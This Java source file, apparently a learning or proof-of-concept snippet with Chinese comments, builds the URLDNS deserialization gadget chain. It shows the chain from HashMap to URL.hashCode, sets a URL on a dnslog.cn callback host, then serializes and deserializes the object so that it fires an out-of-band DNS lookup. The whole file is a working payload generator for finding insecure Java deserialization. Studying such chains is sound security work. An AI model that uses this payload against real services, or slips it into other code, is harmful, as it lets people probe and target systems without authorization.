import java.io.*;
import java.lang.reflect.Field;
import java.net.*;
import java.util.HashMap;

public class GenURLDNS {
    /**
     * Gadget Chain:
     * HashMap.readObject() -> putVal(....) -> hash()
     * URL.hashCode() 此处判断hashCode必须是-1，否则不会继续往下走
     * URLStreamHandler.hashCode() -> getHostAddress() -> InetAddress.getByName()
     */
    public static void main(String[] args) throws Exception {
        URLStreamHandler URLStreamHanderObj = new URLStreamHandler() {
            @Override
            protected URLConnection openConnection(URL u) throws IOException {
                return null;
            }

            @Override
            protected int hashCode(URL u) {
                return -1;
            }
        };
        URL url = new URL(null, "http://13.2f882y.dnslog.cn", URLStreamHanderObj);

        HashMap hashMap = new HashMap();
        hashMap.put(url, "");

//        Field hashCodeField = URL.class.getDeclaredField("hashCode");
//        hashCodeField.setAccessible(true);
//        hashCodeField.set(url, -1);
//        序列化
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(hashMap);
        byte[] bytes = byteArrayOutputStream.toByteArray();

//        反序列化
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();
    }

}
